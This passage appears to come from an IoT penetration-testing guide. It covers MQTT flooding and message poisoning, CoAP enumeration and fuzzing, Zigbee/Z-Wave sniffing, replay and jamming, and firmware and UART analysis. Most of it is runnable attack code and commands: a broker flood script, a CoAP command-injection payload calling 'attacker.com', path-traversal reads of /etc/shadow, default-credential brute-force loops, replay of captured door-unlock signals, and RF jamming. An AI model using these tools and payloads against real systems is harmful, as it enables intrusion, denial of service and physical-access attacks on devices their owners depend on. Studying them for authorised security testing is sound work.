    threads = []
    
    for i in range(num_clients):
        t = threading.Thread(target=connect_client, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
        
        if i % 10 == 0:
            print(f"[*] Started {i} connections")
    
    # Wait
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Stopping...")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <broker_ip> <port> [mode]")
        print("Modes: publish, connect")
        sys.exit(1)
    
    broker = sys.argv[1]
    port = int(sys.argv[2])
    mode = sys.argv[3] if len(sys.argv) > 3 else "publish"
    
    if mode == "publish":
        flood_publish(broker, port, "test", 10000)
    elif mode == "connect":
        connection_flood(broker, port, 100)
```

### MQTT Message Manipulation

**Retained Message Poisoning**

```bash
# Publish malicious retained message
mosquitto_pub -h 192.168.1.100 -t 'home/status' -m 'COMPROMISED' -r

# This message will be sent to all future subscribers

# Publish malicious command as retained
mosquitto_pub -h 192.168.1.100 -t 'device/command' -m '{"cmd":"backdoor"}' -r

# Clear retained message
mosquitto_pub -h 192.168.1.100 -t 'home/status' -n -r
```

**Will Message Abuse**

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import sys

def will_message_attack(broker, port=1883):
    """Set malicious will message"""
    
    client = mqtt.Client()
    
    # Set will message (sent when client disconnects unexpectedly)
    will_payload = '{"status":"hacked","command":"reboot"}'
    client.will_set('system/status', will_payload, qos=2, retain=True)
    
    try:
        client.connect(broker, port, 60)
        print("[+] Connected with malicious will message")
        print("[*] Will message will be published on disconnect")
        
        # Disconnect abruptly to trigger will
        client.disconnect()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <broker_ip> [port]")
        sys.exit(1)
    
    will_message_attack(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 1883)
```

### MQTT over TLS Testing

**Certificate Analysis**

```bash
# Extract certificate from MQTT/TLS broker
openssl s_client -connect 192.168.1.100:8883 -showcerts

# Save certificate
openssl s_client -connect 192.168.1.100:8883 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > mqtt_cert.pem

# View certificate details
openssl x509 -in mqtt_cert.pem -text -noout

# Check certificate validity
openssl x509 -in mqtt_cert.pem -noout -dates

# Test SSL/TLS vulnerabilities
sslscan 192.168.1.100:8883
testssl.sh 192.168.1.100:8883
```

**Self-Signed Certificate Bypass**

```bash
# Connect without certificate validation
mosquitto_sub -h 192.168.1.100 -p 8883 -t '#' --insecure

# With CA certificate
mosquitto_sub -h 192.168.1.100 -p 8883 -t '#' --cafile ca.crt

# With client certificate
mosquitto_sub -h 192.168.1.100 -p 8883 -t '#' \
  --cafile ca.crt --cert client.crt --key client.key
```

---

## Important Subtopics for Further Study

- **Mobile Application Security (Android/iOS)** - APK/IPA analysis, SSL pinning bypass, root/jailbreak detection
- **BLE (Bluetooth Low Energy) Security** - GATT service enumeration, characteristic fuzzing
- **Zigbee/Z-Wave Security** - RF protocol analysis, replay attacks, mesh network exploitation
- **Hardware Hacking** - JTAG/SWD debugging, chip-off analysis, side-channel attacks
- **CoAP (Constrained Application Protocol)** - IoT RESTful protocol enumeration and exploitation
- **Industrial IoT (IIoT) Protocols** - Modbus, BACnet, OPC-UA security assessment

---

## CoAP Protocol Analysis

Constrained Application Protocol (CoAP) is a lightweight HTTP-like protocol designed for IoT devices with limited processing power and bandwidth. It operates over UDP (typically port 5683 for non-secure, 5684 for DTLS-secured CoAP).

### CoAP Protocol Fundamentals

**Protocol Characteristics**:

- UDP-based (default port 5683)
- RESTful architecture (similar to HTTP)
- Four message types: CON (Confirmable), NON (Non-confirmable), ACK (Acknowledgement), RST (Reset)
- Four method codes: GET, POST, PUT, DELETE
- Response codes similar to HTTP (2.xx success, 4.xx client error, 5.xx server error)
- Supports resource discovery via `/.well-known/core`
- Optional DTLS encryption (CoAPS on port 5684)

**CoAP Message Structure**:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Ver| T |  TKL  |      Code     |          Message ID           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   Token (if any, TKL bytes) ...
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   Options (if any) ...
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|1 1 1 1 1 1 1 1|    Payload (if any) ...
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### Discovering CoAP Services

**Network Scanning for CoAP**

```bash
# Nmap scan for CoAP
nmap -sU -p 5683 192.168.1.0/24

# Version detection
nmap -sU -p 5683 -sV 192.168.1.0/24

# CoAP-specific script
nmap -sU -p 5683 --script coap-resources 192.168.1.50
```

**Multicast Discovery**

```bash
# CoAP uses multicast for service discovery
# IPv4 multicast: 224.0.1.187
# IPv6 multicast: FF02::FD, FF05::FD

# Send multicast GET request to discover devices
echo -ne '\x40\x01\x12\x34\xbb.well-known\x04core' | nc -u 224.0.1.187 5683
```

**ZMap CoAP Scanning**

```bash
# Fast Internet-wide CoAP discovery
zmap -p 5683 --probe-module=udp --probe-args=file:coap_probe.pkt -o coap_hosts.txt
```

### CoAP Client Tools

**coap-client (libcoap)**

```bash
# Install
apt-get install libcoap2-bin

# GET request
coap-client -m get coap://192.168.1.50:5683/temperature

# Resource discovery
coap-client -m get coap://192.168.1.50:5683/.well-known/core

# POST request
coap-client -m post coap://192.168.1.50:5683/command -e "turn_on"

# PUT request
coap-client -m put coap://192.168.1.50:5683/config -e '{"mode":"manual"}'

# DELETE request
coap-client -m delete coap://192.168.1.50:5683/session/123

# Observe resource (long-lived connection)
coap-client -m get -s 3600 coap://192.168.1.50:5683/sensor

# Using DTLS (CoAPS)
coap-client -m get coaps://192.168.1.50:5684/temperature -u username -k password
```

**CoAPthon**

```python
# Install
pip install CoAPthon3

# Python client example
from coapthon.client.helperclient import HelperClient

host = "192.168.1.50"
port = 5683
path = "temperature"

client = HelperClient(server=(host, port))
response = client.get(path)
print(response.pretty_print())
client.stop()
```

**Custom CoAP Request with Python**

```python
from coapthon.client.helperclient import HelperClient
from coapthon import defines

def enumerate_coap_resources(host, port=5683):
    client = HelperClient(server=(host, port))
    
    # Resource discovery
    response = client.get(".well-known/core")
    if response:
        print("[+] Discovered resources:")
        print(response.payload)
        
        # Parse and test each resource
        resources = parse_link_format(response.payload)
        for resource in resources:
            print(f"\n[*] Testing {resource}")
            test_response = client.get(resource)
            if test_response:
                print(f"    Response: {test_response.payload}")
    
    client.stop()

def parse_link_format(payload):
    # Simple parser for link-format
    resources = []
    links = payload.split(',')
    for link in links:
        if '<' in link and '>' in link:
            resource = link.split('<')[1].split('>')[0]
            resources.append(resource)
    return resources

enumerate_coap_resources("192.168.1.50")
```

### CoAP Resource Discovery

**Well-Known Core Endpoint**

```bash
# Standard resource discovery
coap-client -m get coap://192.168.1.50/.well-known/core

# Typical response format (link-format RFC 6690)
# </sensors/temp>;ct=0,</sensors/light>;ct=0,</actuators/led>;ct=0
```

**Parsing Resource Descriptions**

```bash
# Extract resource paths
coap-client -m get coap://192.168.1.50/.well-known/core | grep -oP '(?<=<)[^>]+'

# Resources often include metadata:
# ct = Content-Format (0=text/plain, 40=application/link-format, 41=application/xml, 42=application/octet-stream, 50=application/json)
# rt = Resource Type
# if = Interface Description
# sz = Maximum Size Estimate
# obs = Observable
```

**Directory Bruteforcing**

```bash
# Common CoAP resource paths
/sensors
/actuators
/status
/config
/api
/data
/control
/device
/info
/temperature
/humidity
/light
/motion
/door
/lock
/power
/relay

# Automated bruteforce
for path in $(cat coap_wordlist.txt); do
    response=$(coap-client -m get -B 1 coap://192.168.1.50/$path 2>&1)
    if echo "$response" | grep -q "2.05"; then
        echo "[+] Found: /$path"
    fi
done
```

### CoAP Enumeration and Testing

**Method Testing**

```bash
# Test all HTTP-like methods on each resource
for method in get post put delete; do
    echo "[*] Testing $method"
    coap-client -m $method coap://192.168.1.50/api/command
done
```

**Parameter Fuzzing**

```bash
# POST parameter fuzzing
for payload in "1" "0" "true" "false" "admin" "test" '{"cmd":"status"}'; do
    echo "[*] Testing payload: $payload"
    coap-client -m post coap://192.168.1.50/control -e "$payload"
done
```

**Authentication Testing**

```bash
# Test without authentication
coap-client -m get coap://192.168.1.50/admin

# Test with basic credentials (if DTLS supported)
coap-client -m get coaps://192.168.1.50:5684/admin -u admin -k admin

# Test common credentials
for cred in "admin:admin" "root:root" "admin:password" "user:user"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    echo "[*] Testing $user:$pass"
    coap-client -m get coaps://192.168.1.50:5684/admin -u $user -k $pass
done
```

**Observing Resources**

```bash
# CoAP Observe option allows long-lived subscriptions to resource changes
coap-client -m get -s 3600 coap://192.168.1.50/sensor/motion

# Monitor multiple resources
for resource in temperature humidity light; do
    coap-client -m get -s 3600 coap://192.168.1.50/sensors/$resource &
done
```

### CoAP Security Testing

**Unauthenticated Access**

```bash
# Test access to sensitive resources without authentication
coap-client -m get coap://192.168.1.50/admin/users
coap-client -m get coap://192.168.1.50/config
coap-client -m post coap://192.168.1.50/control/unlock -e "1"
```

**Command Injection**

```bash
# Test for command injection in CoAP payloads
coap-client -m post coap://192.168.1.50/execute -e "test; id"
coap-client -m post coap://192.168.1.50/execute -e "test\`whoami\`"
coap-client -m post coap://192.168.1.50/execute -e '{"cmd":"update & ping -c 5 attacker.com"}'
```

**Path Traversal**

```bash
# Test for path traversal in resource paths
coap-client -m get coap://192.168.1.50/../../../etc/passwd
coap-client -m get coap://192.168.1.50/file?path=../../../etc/shadow
```

**Replay Attacks**

[Inference: CoAP includes message IDs and tokens to prevent replay attacks, but implementation quality varies. Some devices may not properly validate message freshness, especially for non-confirmable messages.]

```bash
# Capture legitimate request
tcpdump -i eth0 -w coap_capture.pcap udp port 5683

# Replay captured packet
tcpreplay -i eth0 coap_capture.pcap
```

**Amplification Attacks**

CoAP can be exploited for DDoS amplification due to UDP usage:

```bash
# Send small request, receive large response
# Spoof source IP to victim
coap-client -m get coap://192.168.1.50/.well-known/core
# If response is significantly larger than request, amplification is possible
```

[Unverified: CoAP amplification effectiveness depends on response size ratios. Resource discovery responses can be large, but many CoAP implementations limit response sizes to prevent abuse.]

### CoAP Packet Analysis with Wireshark

**Capture Filter**

```
udp port 5683 or udp port 5684
```

**Display Filter**

```
coap
coap.code == 1  # GET requests
coap.code == 2  # POST requests
coap.code == 3  # PUT requests
coap.code == 4  # DELETE requests
coap.code >= 64 and coap.code < 96  # Success responses (2.xx)
coap.code >= 128 and coap.code < 160  # Client errors (4.xx)
coap.opt.uri_path  # Show URI paths
```

**Analysis Steps**

```
1. Capture CoAP traffic
2. Identify request/response patterns
3. Extract resource paths and payloads
4. Identify authentication mechanisms (or lack thereof)
5. Look for sensitive data in plaintext
6. Document API endpoints and functionality
```

### CoAP Exploitation Tools

**coapthon3 Server for Testing**

```python
from coapthon.resources.resource import Resource
from coapthon.server.coap import CoAP

class TestResource(Resource):
    def __init__(self, name="TestResource", coap_server=None):
        super(TestResource, self).__init__(name, coap_server, visible=True, observable=True, allow_children=True)
        self.payload = "Test Resource"

    def render_GET(self, request):
        return self

    def render_POST(self, request):
        self.payload = request.payload
        return self

def main():
    server = CoAP(("0.0.0.0", 5683))
    server.add_resource('test/', TestResource())
    try:
        server.listen(10)
    except KeyboardInterrupt:
        server.close()

if __name__ == '__main__':
    main()
```

**CoAP Fuzzing**

```python
from coapthon.client.helperclient import HelperClient
import random
import string

def fuzz_coap_resource(host, port, path):
    client = HelperClient(server=(host, port))
    
    # Payload fuzzing
    payloads = [
        "A" * 1000,  # Long string
        "A" * 10000,  # Very long string
        "%s%s%s%s",  # Format string
        "'; DROP TABLE devices;--",  # SQL injection
        "../../../etc/passwd",  # Path traversal
        "<script>alert(1)</script>",  # XSS
        '{"cmd":"' + "A" * 1000 + '"}',  # JSON injection
    ]
    
    for payload in payloads:
        print(f"[*] Testing payload: {payload[:50]}...")
        try:
            response = client.post(path, payload)
            if response:
                print(f"    Response code: {response.code}")
                print(f"    Response: {response.payload[:100]}")
        except Exception as e:
            print(f"    Error: {e}")
    
    client.stop()

fuzz_coap_resource("192.168.1.50", 5683, "api/command")
```

## Zigbee/Z-Wave Analysis

Zigbee and Z-Wave are low-power wireless mesh networking protocols widely used in smart home devices, industrial sensors, and IoT ecosystems. Both operate in the ISM band and are susceptible to various RF and protocol-level attacks.

### Zigbee Protocol Overview

**Characteristics**:

- Frequency: 2.4 GHz (global), 868 MHz (Europe), 915 MHz (Americas)
- Range: 10-100 meters
- Data rate: 20-250 kbps
- Based on IEEE 802.15.4 standard
- Mesh networking topology
- AES-128 encryption (when properly configured)
- Three device types: Coordinator, Router, End Device

**Zigbee Security**:

- Network key (shared among all devices)
- Link keys (pairwise keys between devices)
- Trust Center (coordinator managing security)
- Four security levels: 0x00 (none) to 0x05 (encrypted with MIC-128)

### Z-Wave Protocol Overview

**Characteristics**:

- Frequency: 868.42 MHz (Europe), 908.42 MHz (US), varies by region
- Range: Up to 30 meters (direct), 100+ meters (mesh)
- Data rate: 9.6-100 kbps
- Proprietary protocol (Sigma Designs/Silicon Labs)
- Mesh networking (up to 232 nodes)
- S0, S2 security frameworks (AES-128)

**Z-Wave Security**:

- S0: Legacy security with shared network key
- S2: Modern security with authenticated key exchange
- Three S2 security classes: Unauthenticated, Authenticated, Access Control

[Unverified: Z-Wave's proprietary nature means security implementation details are not fully public, and analysis relies on reverse engineering and documented vulnerabilities.]

### Hardware Requirements

**Software Defined Radio (SDR)**

```bash
# RTL-SDR (inexpensive, receive-only)
- Frequency range: 24 - 1766 MHz
- Good for initial reconnaissance
- Cannot transmit

# HackRF One
- Frequency range: 1 MHz - 6 GHz
- Half-duplex transceiver
- Can transmit and receive

# USRP (Universal Software Radio Peripheral)
- Professional-grade SDR
- Full-duplex capability
- Higher cost

# BladeRF
- Full-duplex transceiver
- 300 MHz - 3.8 GHz
- Good mid-range option
```

**Zigbee-Specific Hardware**

```bash
# ApiMote
- Purpose-built for Zigbee assessment
- Based on CC2531 chip
- Packet injection and sniffing

# Atmel RZUSBstick (discontinued)
- Historical Zigbee assessment tool
- Limited availability

# CC2531 USB Dongle
- Texas Instruments Zigbee chip
- Requires firmware flashing
- Inexpensive option

# nRF52840 Dongle
- Nordic Semiconductor
- Good for Zigbee/Thread analysis
```

**Z-Wave Hardware**

```bash
# Z-Wave USB Stick (Sigma Designs/Aeotec)
- Official Z-Wave controller
- Can be used for legitimate control and assessment

# HackRF One / USRP
- Can receive/transmit Z-Wave frequencies
- Requires custom software
```

### Zigbee Assessment Setup

**Installing Killerbee Framework**

```bash
# Install dependencies
apt-get install python3-pip python3-dev libusb-1.0-0-dev libgcrypt20-dev

# Install Killerbee
pip3 install killerbee

# Verify installation
zbid  # Identify connected Zigbee devices
```

**Flashing CC2531 with Zigbee Sniffer Firmware**

```bash
# Requires CC Debugger or Raspberry Pi for flashing
# Download sniffer firmware from TI
# Use cc-tool or Flash Programmer

# With cc-tool
git clone https://github.com/dashesy/cc-tool.git
cd cc-tool
./configure
make
sudo make install

# Flash firmware
cc-tool -e -w CC2531_sniffer.hex
```

**Installing Scapy-Radio**

```bash
# Scapy extension for radio protocols
git clone https://github.com/BastilleResearch/scapy-radio
cd scapy-radio
python3 setup.py install
```

### Zigbee Network Discovery

**Scanning for Networks**

```bash
# Using Killerbee zbstumbler
zbstumbler -c 11-26

# Scan specific channel
zbstumbler -c 15

# Save results
zbstumbler -c 11-26 -o networks.json
```

**Channel Analysis**

```bash
# Zigbee 2.4 GHz channels: 11-26
# Scan all channels for active networks
for channel in {11..26}; do
    echo "[*] Scanning channel $channel"
    timeout 30 zbstumbler -c $channel
done
```

**Network Information Discovery**

```bash
# Discovered information includes:
# - PAN ID (Personal Area Network ID)
# - Extended PAN ID
# - Channel
# - Source addresses
# - Network key encryption status
```

### Zigbee Packet Capture

**Using Killerbee zbdump**

```bash
# Capture on specific channel
zbdump -c 15 -w capture.pcap

# Capture on all channels (rotating)
zbdump -w capture.pcap

# Capture with filtering
zbdump -c 15 -f "panid==0x1234" -w capture.pcap
```

**Using Wireshark with Zigbee**

```bash
# Start capture
zbdump -c 15 -W

# Or pipe to Wireshark
zbdump -c 15 | wireshark -k -i -

# Wireshark display filters
wpan.dst_pan == 0x1234  # Filter by PAN ID
zbee_nwk  # Zigbee network layer
zbee_aps  # Zigbee application support layer
zbee_zcl  # Zigbee cluster library
```

**Long-Term Monitoring**

```bash
# Capture for extended period
zbdump -c 15 -w capture_$(date +%Y%m%d_%H%M%S).pcap &

# Rotate captures every hour
while true; do
    zbdump -c 15 -w capture_$(date +%Y%m%d_%H%M%S).pcap &
    PID=$!
    sleep 3600
    kill $PID
done
```

### Zigbee Key Extraction

**Sniffing Network Key During Joining**

When a new device joins a Zigbee network, the network key is transmitted (encrypted with a default or known transport key):

```bash
# Capture during device pairing
zbdump -c 15 -w join_capture.pcap

# Look for Device Announcement and Transport Key packets
# Default Zigbee Alliance transport key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
# "ZigBeeAlliance09" in hex
```

**Using zbkey**

```bash
# Attempt to extract keys from capture
zbkey -f capture.pcap

# Analyze with known transport key
zbkey -f capture.pcap -t 5A6967426565416C6C69616E636530 39
```

**Cracking Network Keys**

If keys are encrypted with unknown transport keys:

```bash
# Requires significant computational resources
# Most effective if key derivation is weak
```

[Inference: Cracking AES-128 keys with modern devices is computationally infeasible without significant flaws in implementation. Key extraction relies primarily on capturing key transmission during device pairing or exploiting known default keys.]

### Zigbee Replay Attacks

**Capturing Commands**

```bash
# Capture legitimate commands (e.g., door unlock, light on)
zbdump -c 15 -w unlock_command.pcap

# Filter for specific device communication
zbdump -c 15 -f "addr==0x1234" -w commands.pcap
```

**Replaying Packets**

```bash
# Using zbreplay (Killerbee)
zbreplay -c 15 -f unlock_command.pcap

# Replay specific packet range
zbreplay -c 15 -f commands.pcap -r 10-20

# Continuous replay
while true; do
    zbreplay -c 15 -f unlock_command.pcap
    sleep 5
done
```

[Unverified: Zigbee replay protection effectiveness depends on implementation. Properly configured networks use frame counters to prevent replay attacks, but many devices have weak or no replay protection.]

### Zigbee Injection Attacks

**Using zbgoodfind (Finding Valid Addresses)**

```bash
# Discover valid network addresses
zbgoodfind -c 15 -p 0x1234

# Save discovered addresses
zbgoodfind -c 15 -p 0x1234 -o addresses.json
```

**Packet Injection**

```bash
# Using zbapc (Killerbee Active Packet Capture)
# Inject packets onto Zigbee network
zbapc -c 15 -i inject_packet.hex

# Craft custom packets with Scapy
```

**Custom Packet Crafting with Scapy**

```python
from scapy.all import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *

# Craft Zigbee packet
packet = Dot15d4(fcf_frametype=1) / \
         Dot15d4Data(dest_panid=0x1234, dest_addr=0xFFFF, src_addr=0x0000) / \
         ZigbeeNWK(frametype=0, discover_route=0) / \
         ZigbeeAppDataPayload() / \
         Raw(load=b"\x01\x02\x03")

# Send packet
sendp(packet, iface="your_interface")
```

### Z-Wave Assessment Setup

**Z-Wave Sniffing with SDR**

```bash
# Install GNU Radio
apt-get install gnuradio

# Install gr-zwave
git clone https://github.com/cclautert/gr-zwave
cd gr-zwave
mkdir build
cd build
cmake ../
make
sudo make install
```

**Using HackRF for Z-Wave**

```bash
# Receive Z-Wave traffic (US frequency: 908.42 MHz)
hackrf_transfer -r zwave_capture.bin -f 908420000 -s 2000000 -g 20 -l 32

# Process captured data
# Requires custom demodulation and decoding
```

**Z-Wave Toolchain**

```bash
# EZWave (Python library for Z-Wave)
pip install ezwave

# Scapy-radio with Z-Wave support
# Provides protocol parsing capabilities
```

[Unverified: Z-Wave analysis tools are less mature than Zigbee tools due to the proprietary nature of the protocol. Most tools are research-grade and may not handle all Z-Wave packet types.]

### Z-Wave Network Enumeration

**Home ID Discovery**

```bash
# Z-Wave Home ID uniquely identifies a network
# Captured from network traffic or during device inclusion

# Using SDR capture and analysis
# Look for Network Management frames
```

**Node Enumeration**

```bash
# Z-Wave networks support up to 232 nodes (Node ID 1-232)
# Node 1 is typically the primary controller

# Passive enumeration via traffic analysis
# Active enumeration by attempting communication with node IDs
```

### Z-Wave Packet Injection

**Jamming Z-Wave Communication**

```bash
# Using HackRF to transmit noise on Z-Wave frequency
hackrf_transfer -t /dev/zero -f 908420000 -s 2000000 -x 47

# Selective jamming during specific operations
# Can prevent commands from being received
```

**Replay Attacks**

```bash
# Capture legitimate command (e.g., door unlock)
hackrf_transfer -r unlock.bin -f 908420000 -s 2000000

# Replay captured signal
hackrf_transfer -t unlock.bin -f 908420000 -s 2000000 -x 47
```

[Inference: Z-Wave S2 security includes rolling codes and encryption that should prevent simple replay attacks. However, S0 (legacy security) and unencrypted communications remain vulnerable to replay.]

### Z-Wave Key Extraction

**S0 Default Key**

```
Many Z-Wave S0 devices use default or predictable keys
Default key often: 0x00000000000000000000000000000000
```

**Key Sniffing During Inclusion**

```bash
# Monitor network during device pairing
# S0 key exchange is encrypted with a default key
# S2 key exchange requires physical access or PIN

# Captured inclusion process can reveal S0 keys
# S2 is more resistant to passive key extraction
```

### Commercial Zigbee/Z-Wave Assessment Tools

**Ubiqua Protocol Analyzer**

- Commercial Zigbee/Thread analyzer
- Hardware sniffer with comprehensive software
- Expensive but professional-grade

**Keysight (formerly Agilent) Z-Wave Analyzer**

- Commercial Z-Wave analysis platform
- Protocol decoding and troubleshooting
- High cost

## Embedded Device Exploitation

Embedded devices include routers, IP cameras, smart appliances, industrial controllers, and countless other specialized hardware. Exploitation focuses on firmware analysis, hardware debugging interfaces, and software vulnerabilities.

### Embedded Device Reconnaissance

**Network Service Enumeration**

```bash
# Comprehensive port scan
nmap -p- -sV -sC -A 192.168.1.100

# Common embedded device services
nmap -p 21,22,23,80,443,515,631,8080,8443,9100 192.168.1.0/24

# UPnP discovery
nmap -sU -p 1900 --script upnp-info 192.168.1.0/24
```

**Web Interface Analysis**

```bash
# Identify web technologies
whatweb http://192.168.1.100

# Directory enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Check for default credentials
# Common embedded device credentials:
# admin:admin
# admin:password
# root:root
# admin:(blank)
# user:user
```

**Fingerprinting Device Type**

```bash
# HTTP headers often reveal device type
curl -I http://192.168.1.100

# Common identifiers:
# Server: lighttpd, uc-httpd, GoAhead-Webs, RomPager, Boa
# Often custom or outdated web servers

# Banner grabbing other services
nc 192.168.1.100 23  # Telnet
nc 192.168.1.100 21  # FTP
```

### Firmware Acquisition

**Downloading from Manufacturer**

```bash
# Official firmware updates often available on support pages
wget https://vendor.com/downloads/firmware_v1.2.3.bin

# Check for firmware in download managers
# routers often have firmware update checks
```

**Extracting from Device**

**Via Web Interface**

```bash
# Some devices allow firmware backup/download
# Check admin panels for backup/restore features
```

**Via Debug Interfaces (UART/JTAG)**

```bash
# Covered in hardware exploitation section below
```

**Via Network Capture**

```bash
# Monitor firmware update process
tcpdump -i eth0 -w firmware_download.pcap host 192.168.1.100

# Extract firmware from PCAP
# Look for HTTP downloads or TFTP transfers
```

**From Flash Memory (Hardware Extraction)**

```bash
# Direct reading of SPI/NAND flash chips
# Requires hardware tools (discussed below)
```

### Firmware Analysis

**Identifying Firmware Type**

```bash
# File type identification
file firmware.bin

# Entropy analysis (detect encryption/compression)
binwalk -E firmware.bin

# String analysis
strings firmware.bin | less
strings firmware.bin | grep -i "password\|admin\|root\|key"
```

**Extracting Firmware Contents**

**Binwalk**

```bash
# Automatic extraction
binwalk -e firmware.bin

# Manual extraction with dd
binwalk firmware.bin
# Note offset of filesystem
dd if=firmware.bin of=filesystem.img bs=1 skip=<offset>

# Extract specific signatures
binwalk --dd='.*' firmware.bin
```

**Firmware Mod Kit (FMK)**

```bash
# Install
git clone https://github.com/rampageX/firmware-mod-kit
cd firmware-mod-kit/src
./configure && make

# Extract firmware
./extract-firmware.sh firmware.bin

# Modify and repack
# (modify files in extracted directory)
./build-firmware.sh firmware/
```

**Jefferson (JFFS2 Extraction)**

```bash
# Install
pip install jefferson

# Extract JFFS2 filesystem
jefferson firmware.bin -d extracted/
```

**Cramfs/Squashfs Extraction**

```bash
# Squashfs
unsquashfs firmware.squashfs

# Cramfs
mkdir extracted
mount -t cramfs firmware.cramfs extracted/
# Or
cramfsck -x extracted firmware.cramfs
```

**Analyzing Extracted Filesystem**

```bash
# Search for sensitive files
find extracted/ -name "*config*"
find extracted/ -name "*password*"
find extracted/ -name "shadow"
find extracted/ -name "passwd"

# Search for hardcoded credentials
grep -r "password" extracted/ grep -r "admin" extracted/ | grep -i "pass" grep -r -E "username.*password" extracted/

# Find SUID binaries
find extracted/ -perm -4000 -type f

# Identify custom binaries for reverse engineering
find extracted/ -type f -executable

# Check for private keys
find extracted/ -name "_.pem" -o -name "_.key" -o -name "id_rsa"

# Look for configuration files
find extracted/ -name "_.conf" -o -name "_.cfg" -o -name "*.ini"
````

### Static Binary Analysis

**File Analysis**
```bash
# Identify architecture and properties
file extracted/bin/httpd
readelf -h extracted/bin/httpd

# List dynamic dependencies
readelf -d extracted/bin/httpd
ldd extracted/bin/httpd  # (if matching architecture)

# Strings analysis
strings extracted/bin/httpd | grep -i "http\|password\|admin\|sql"

# Check for debug symbols
readelf -S extracted/bin/httpd | grep debug
````

**Binary Security Checks**

```bash
# Install checksec
apt-get install checksec

# Check binary protections
checksec --file=extracted/bin/httpd

# Look for:
# - NX (No Execute): Stack execution protection
# - PIE (Position Independent Executable): Address randomization
# - RELRO (Relocation Read-Only): GOT protection
# - Stack Canary: Stack buffer overflow protection

# Many embedded binaries lack these protections
```

**Ghidra Analysis**

```bash
# Install Ghidra from https://ghidra-sre.org/

# Import binary
# File -> Import File -> Select binary
# Analyze -> Auto Analyze (Yes to all default options)

# Key analysis steps:
# 1. Identify main function
# 2. Find interesting strings and xrefs
# 3. Analyze authentication functions
# 4. Look for command injection vulnerabilities
# 5. Identify buffer overflow opportunities
```

**Finding Vulnerabilities in Binaries**

**Command Injection**

```c
// Vulnerable pattern in decompiled code:
sprintf(cmd, "ping -c 1 %s", user_input);
system(cmd);

// Test by providing: 127.0.0.1; id
```

**Buffer Overflow**

```c
// Vulnerable pattern:
char buffer[64];
strcpy(buffer, user_input);  // No bounds checking
gets(buffer);                 // Dangerous function
```

**Format String**

```c
// Vulnerable pattern:
printf(user_input);           // Should be printf("%s", user_input)
sprintf(buffer, user_input);  // No format specifier
```

**Path Traversal**

```c
// Vulnerable pattern:
sprintf(path, "/var/www/%s", filename);
fopen(path, "r");
// If filename = "../../../etc/passwd"
```

### Dynamic Firmware Analysis with Emulation

**QEMU User Mode Emulation**

```bash
# Install QEMU
apt-get install qemu-user-static

# Copy QEMU binary to firmware root
cp /usr/bin/qemu-arm-static extracted/

# Chroot into firmware
chroot extracted/ /qemu-arm-static /bin/sh

# Execute binaries
/qemu-arm-static /usr/sbin/httpd
```

**QEMU System Mode Emulation**

```bash
# Requires kernel and understanding of device architecture
qemu-system-arm -M versatilepb \
  -kernel zImage \
  -dtb versatile-pb.dtb \
  -drive file=filesystem.ext2,if=scsi \
  -append "root=/dev/sda console=ttyAMA0" \
  -net nic -net tap,ifname=tap0 \
  -nographic
```

**Firmadyne (Automated Firmware Emulation)**

```bash
# Install Firmadyne
git clone --recursive https://github.com/firmadyne/firmadyne
cd firmadyne
./download.sh

# Setup database
sudo -u postgres createuser -P firmadyne
sudo -u postgres createdb -O firmadyne firmware

# Import firmware
./fat.py <firmware.bin>

# Emulate
./run.sh <image_id>
```

**Firmware Analysis Toolkit (FAT)**

```bash
# Wrapper around Firmadyne with easier setup
git clone https://github.com/attify/firmware-analysis-toolkit
cd firmware-analysis-toolkit
./setup.sh

# Analyze firmware
python3 fat.py firmware.bin

# Access emulated device
# Network accessible at dynamically assigned IP
```

[Unverified: Firmware emulation success rates vary significantly based on device architecture, custom hardware dependencies, and kernel requirements. Some devices may not fully emulate without specialized hardware or detailed system knowledge.]

### Hardware Debugging Interfaces

**UART (Universal Asynchronous Receiver/Transmitter)**

UART provides serial console access, often with root shell access on embedded devices.

**Identifying UART Pins**

```
Common locations:
- Unpopulated header pins on PCB
- Test points labeled TX, RX, GND, VCC
- Groups of 3-4 pins in a row

Pin identification:
- GND: Use multimeter continuity test to ground points (shielding, etc.)
- VCC: Measure voltage (3.3V or 5V typically)
- TX: Fluctuating voltage during boot (data transmission)
- RX: Usually at steady voltage level

Common pinouts:
GND - TX - RX - VCC
VCC - TX - RX - GND
GND - RX - TX - VCC
```

**UART Connection**

```bash
# Hardware needed:
# - USB to TTL serial adapter (FTDI, CP2102, PL2303)
# - Jumper wires

# Connections:
# Device TX -> Adapter RX
# Device RX -> Adapter TX
# Device GND -> Adapter GND
# (Do NOT connect VCC unless necessary)

# Determine baud rate
# Common rates: 9600, 19200, 38400, 57600, 115200
# Trial and error or use logic analyzer

# Connect with screen
screen /dev/ttyUSB0 115200

# Or minicom
minicom -D /dev/ttyUSB0 -b 115200

# Or pyserial
python3 -m serial.tools.miniterm /dev/ttyUSB0 115200
```

**Exploiting UART Access**

**No Authentication**

```bash
# Many devices boot directly to root shell
# Simply connect and interact

# Common commands:
cat /etc/passwd
cat /etc/shadow
